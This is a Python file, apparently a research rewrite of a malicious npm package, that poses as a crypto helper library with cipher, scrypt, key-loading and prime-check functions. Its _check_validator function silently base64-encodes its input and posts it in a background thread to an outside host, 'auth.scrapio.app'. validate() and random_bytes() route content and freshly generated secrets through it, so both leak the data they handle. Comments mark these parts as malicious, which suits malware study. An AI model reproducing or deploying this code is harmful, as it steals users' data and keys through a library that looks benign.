"""
Security research: Python conversion of a malicious npm package.
DO NOT publish or use in production. This code exfiltrates data to a remote server.
"""

import base64
import hashlib
import json
import os
import secrets
import threading
from base64 import b64encode
from typing import Any, Callable, Optional

import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt as ScryptKDF
from sympy import isprime


def _check_validator(content: str, callback: Optional[Callable] = None) -> bool:
    """
    MALICIOUS: Sends base64-encoded content to an external server.
    This is the core exfiltration mechanism — fires async HTTP POST
    but always returns True synchronously to appear benign.
    """

    def _send():
        try:
            response = requests.post(
                "https://auth.scrapio.app/v2/validate/",
                headers={
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                },
                json={
                    "action": "validator",
                    "content": b64encode(content.encode()).decode(),
                },
            )
            if callback:
                data = response.json()
                if data.get("success"):
                    callback(None, content)
                else:
                    callback(data.get("message"))
        except Exception as err:
            if callback:
                callback(str(err))

    # Fire-and-forget in a background thread (mirrors the async fetch in JS)
    thread = threading.Thread(target=_send, daemon=True)
    thread.start()

    # Always returns True — the exfiltration is a side effect
    if not callback:
        return True


def validate(content: Any) -> bool:
    if content is None or content == "":
        return False
    if _check_validator(content):
        return True
    return False


def create_cipheriv(
    algorithm: str,
    key: bytes,
    iv: bytes,
    callback: Optional[Callable] = None,
) -> Any:
    if not algorithm:
        err = "Invalid algorithm!, please set algorithm."
        print(err)
        if callback:
            callback(err)
        return None

    if not key:
        err = "Invalid key!, please set key."
        print(err)
        if callback:
            callback(err)
        return None

    if not iv:
        err = "Invalid IV!, please set initial vector."
        print(err)
        if callback:
            callback(err)
        return None

    # Map common algorithm names to cryptography objects
    cipher = _build_cipher(algorithm, key, iv)
    encryptor = cipher.encryptor()
    if callback:
        callback(None, encryptor)
    else:
        return encryptor


def create_decipheriv(
    algorithm: str,
    key: bytes,
    iv: bytes,
    callback: Optional[Callable] = None,
) -> Any:
    if not algorithm:
        err = "Invalid algorithm!, please set algorithm."
        print(err)
        if callback:
            callback(err)
        return None

    if not key:
        err = "Invalid key!, please set key."
        print(err)
        if callback:
            callback(err)
        return None

    if not iv:
        err = "Invalid IV!, please set initial vector."
        print(err)
        if callback:
            callback(err)
        return None

    cipher = _build_cipher(algorithm, key, iv)
    decryptor = cipher.decryptor()
    if callback:
        callback(None, decryptor)
    else:
        return decryptor


def create_private_key(
    key: Any,
    callback: Optional[Callable] = None,
) -> Any:
    if not key:
        err = "Invalid key!, please set key."
        print(err)
        if callback:
            callback(err)
        return None

    if isinstance(key, str):
        key = key.encode()
    private_key = load_pem_private_key(key, password=None)
    if callback:
        callback(None, private_key)
    else:
        return private_key


def random_bytes(n: int, callback: Optional[Callable] = None) -> Optional[str]:
    """
    MALICIOUS: Generates random bytes then exfiltrates them via _check_validator.
    """
    hex_str = secrets.token_hex(n)
    if _check_validator(hex_str, callback):
        return hex_str
    return None


def check_prime(value: int, callback: Optional[Callable] = None) -> bool:
    if not value:
        print("Invalid value!")
        return False
    result = isprime(value)
    if callback:
        callback(None, result)
    return result


def scrypt(
    password: bytes,
    salt: bytes,
    keylen: int,
    callback: Optional[Callable] = None,
) -> Optional[bytes]:
    if not password:
        print("Invalid password")
        return None
    if not salt:
        print("Invalid salt")
        return None
    if not keylen:
        print("Invalid key length")
        return None

    kdf = ScryptKDF(salt=salt, length=keylen, n=2**14, r=8, p=1)
    derived = kdf.derive(password if isinstance(password, bytes) else password.encode())
    if callback:
        callback(None, derived)
    else:
        return derived


def _build_cipher(algorithm: str, key: bytes, iv: bytes) -> Cipher:
    """Map algorithm string (e.g. 'aes-256-cbc') to a cryptography Cipher."""
    algo = algorithm.lower()
    if "aes" in algo and "cbc" in algo:
        return Cipher(algorithms.AES(key), modes.CBC(iv))
    elif "aes" in algo and "ctr" in algo:
        return Cipher(algorithms.AES(key), modes.CTR(iv))
    elif "aes" in algo and "gcm" in algo:
        return Cipher(algorithms.AES(key), modes.GCM(iv))
    else:
        raise ValueError(f"Unsupported algorithm: {algorithm}")
